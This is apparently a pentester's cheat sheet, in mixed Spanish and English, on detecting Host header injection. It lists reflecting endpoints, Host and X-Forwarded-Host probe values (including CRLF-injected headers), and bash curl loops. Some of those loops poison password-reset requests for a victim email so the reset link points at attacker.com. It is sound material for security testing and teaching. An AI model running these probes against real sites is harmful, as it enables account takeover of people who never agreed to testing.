---
aliases:
  - HHI Detection
  - Host Header Recon
tags:
  - vuln/host-header-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
---
# Host Header Injection - Detección y Reconocimiento

---

## Identificar Endpoints que Reflejan / Dependen de Host

| **Endpoint** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `/forgot`, `/reset` — emite link en email | Reset password endpoint | Most common vector. |
| `/verify`, `/confirm` — enlaces al user | Email confirmation | Same. |
| Welcome email | First-time signup email | Same. |
| `/password/change` con email | Password change confirm | Same. |
| Email magic link | Login via emailed link | High impact ATO. |
| `redirect_uri` builder | OAuth callback URL generation | OAuth chain. |
| Webhook callback construction | App generates URL para 3rd party callbacks | External calls. |
| `/api-docs` link to base URL | API URL generation en docs | Disclosure. |
| `/sitemap.xml` con absolute URLs | Sitemap / robots | SEO impact. |
| RSS feeds | Feed con absolute self-link | Same. |
| `Cache-Control` based on Host | Cache headers | Cache poisoning. |
| `Location:` constructed from Host | Redirect responses | SSRF / Open Redirect chain. |
| `<base href>` reflexion | Page source con `<base href="https://${HOST}/">` | Direct XSS / hijack. |
| `<link rel="canonical" href="https://${HOST}/page">` | Canonical link | SEO + redirect. |
| Self-referencing links | All `<a href="https://${HOST}/...">` | Asset reroute. |
| Email From / Reply-To | Constructed from Host | Email spoofing. |
| Host-based virtual host | App routes by `Host` header | Multi-tenant routing. |
^hhi-detect-endpoints

---

## Probes con Valores Arbitrarios

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Host: attacker.com` | External Host | Si app responde 200 + reflejes attacker.com → vulnerable. |
| `Host: localhost` | Localhost | Internal access? |
| `Host: 127.0.0.1` | 127.0.0.1 | Same. |
| `Host: 192.168.1.1` | Internal IP | Internal app routing. |
| `Host: random.target.com` | Random subdomain | If valid → wildcard / catch-all. |
| `Host: <unique>.oast.fun` | Burp Collaborator | If app fetches Host → SSRF confirmed. |
| `Host: target.com ` (trailing space) | Spaces in Host | Validation behavior. |
| `Host: ` | Empty Host | Some servers default to first vhost. |
| `Host: target.com\r\nHost: attacker.com` | Multiple Host headers | Some parsers different. |
| `Host: target.com:1337` | Port injection | Port allowed by validator? |
| `Host: https://attacker.com/path` | URL en Host | Absolute URL trick. |
| `Host: target.com\r\nX-Inject: 1` | Embedded special chars | CRLF injection. |
| Length differential | Long Host → check truncation | Edge. |
| `127.0.0.1.attacker.com` (DNS rebind) | If validation fuzzy | Subdomain abuse. |
| Trigger 400 | Malformed Host should 400 | Tolerance check. |
^hhi-detect-probes

### Probe rápido bash

```bash
# Test multiple Host values
for h in 'attacker.com' 'localhost' '127.0.0.1' 'evil.target.com.attacker.com' 'target.com:1337'; do
  echo "=== Host: $h ==="
  curl -s -I -H "Host: $h" https://target.com/ | head -5
  echo
done

# Probe password reset (typical vector)
curl -X POST -H "Host: attacker.com" \
  -d 'email=victim@target.com' \
  https://target.com/forgot
# Check if email arrives con reset link a attacker.com
```

---

## Test Multi-Header Behavior

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Forwarded-Host` | `X-Forwarded-Host: attacker.com` con normal Host | Frontend strips, backend may use. |
| `X-Forwarded-Server` | Less common | Some frameworks. |
| `X-Host` | Custom header | Frequent en frameworks. |
| `X-Forwarded-For` | IP-based | Adjacent vector. |
| `X-Real-IP` | Same | Same. |
| `Forwarded:` (RFC 7239) | `Forwarded: host=attacker.com` | RFC standard. |
| `X-Original-URL` | `X-Original-URL: /admin` | IIS path override. |
| `X-Rewrite-URL` | Same | IIS variant. |
| `X-HTTP-Host-Override` | Custom | Edge. |
| Combinations | Multiple headers simultáneos | Backend may use first/last. |
| `X-Forwarded-Host: a, b` | Comma-separated values | Different servers handle differently. |
| `X-Forwarded-Host:\tattacker.com` | Whitespace variants | Tab/space. |
| Multi-level routing | Apps con multiple proxy layers | Headers stripped o forwarded? |
| `:authority` HTTP/2 pseudo | H2 equivalent of Host | H2-specific. |
| Combine con HRS | Smuggle Host injection en second request | Combo. |
^hhi-detect-multi-header

### Multi-header probe matrix

```bash
# Standard Host + alternative
HEADERS=(
  'X-Forwarded-Host'
  'X-Forwarded-Server'
  'X-Host'
  'X-HTTP-Host-Override'
  'X-Original-URL'
  'X-Rewrite-URL'
  'Forwarded'
)

for h in "${HEADERS[@]}"; do
  echo "=== $h: attacker.com ==="
  R=$(curl -s -X POST -H "$h: attacker.com" \
       -d 'email=victim@target.com' \
       https://target.com/forgot)
  # Check response patterns
  echo "$R" | grep -iE 'attacker|forgot|reset|email'
done

# Combine multiple
curl -X POST \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Host: attacker.com" \
  -d 'email=victim@target.com' \
  https://target.com/forgot
```

---
